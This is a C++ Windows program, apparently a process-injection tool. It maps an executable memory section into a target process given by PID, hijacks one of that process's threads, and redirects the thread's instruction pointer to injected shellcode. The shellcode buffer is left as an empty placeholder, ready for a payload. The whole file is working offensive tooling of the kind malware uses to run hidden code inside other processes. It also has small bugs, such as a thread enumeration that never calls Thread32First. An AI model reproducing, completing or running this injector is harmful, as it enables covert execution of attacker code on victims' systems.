#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include "NTAPIs.h"

	DWORD findThread( DWORD pid ) {

		THREADENTRY32 te       {.dwSize = sizeof(THREADENTRY32)};
		HANDLE        hSnapshot{};

		hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

		do {
			if (te.th32OwnerProcessID == pid ) {
				std::cout << "Found thread id " << te.th32ThreadID << '\n';
				return te.th32ThreadID;
			}
		} while (Thread32Next(hSnapshot, &te));
		std::cout << "Could not find a thread." << std::endl;
		std::exit(1);
	}

unsigned char shellcode[] =  {0};

int main( int argc, char* argv[]) {
    
    if ( argc < 2 ){
      std::cout << "Usage .\\thread.exe <PID>\n";
      return 1;
    }

	  NT::NtMapViewOfSection  NtMapViewSection = (NT::NtMapViewOfSection)GetProcAddress(GetModuleHandle("ntdll.dll"),"NtMapViewOfSection");
	  NT::NtCreatSection      NtCreateSection  = (NT::NtCreatSection)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateSection");

    NT::OBJECT_ATTRIBUTES   OA{};

	  InitializeObjectAttributes(&OA, NULL, 0, NULL, NULL);

	  CONTEXT ctx    {.ContextFlags = CONTEXT_FULL};

	  HANDLE  hThread {},
	          hSection{};

	  PVOID   lbuf    {},
			      rbuf    {};
    
		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,atoi( argv[1] ) );
		LARGE_INTEGER largeInt{sizeof(shellcode)};

		NtCreateSection ( &hSection,SECTION_ALL_ACCESS,&OA,&largeInt,PAGE_EXECUTE_READWRITE,SEC_COMMIT,NULL);
		NtMapViewSection( hSection, hProcess,&rbuf, NULL, NULL, NULL, (SIZE_T*)&largeInt, (NT::SECTION_INHERIT)2, NULL , PAGE_EXECUTE_READWRITE);
		NtMapViewSection( hSection, GetCurrentProcess(),&lbuf,NULL, NULL,NULL, (SIZE_T*)&largeInt, (NT::SECTION_INHERIT)2, NULL , PAGE_EXECUTE_READWRITE);

		hThread = OpenThread( THREAD_ALL_ACCESS, 0, findThread( atoi( argv[1] ) ) );

		SuspendThread(hThread);
		if (hThread == nullptr) {
			std::cout << "Error Opening thread" << GetLastError() << std::endl;
			return -1;
		}
		std::cout << "Opened Thread\n";

		GetThreadContext(hThread,&ctx);

		memcpy(lbuf,shellcode,sizeof(shellcode));
		ctx.Rip = reinterpret_cast<DWORD64>(rbuf);

		SetThreadContext(hThread,&ctx);
		ResumeThread(hThread);
		WaitForSingleObject(hThread,2000);
}
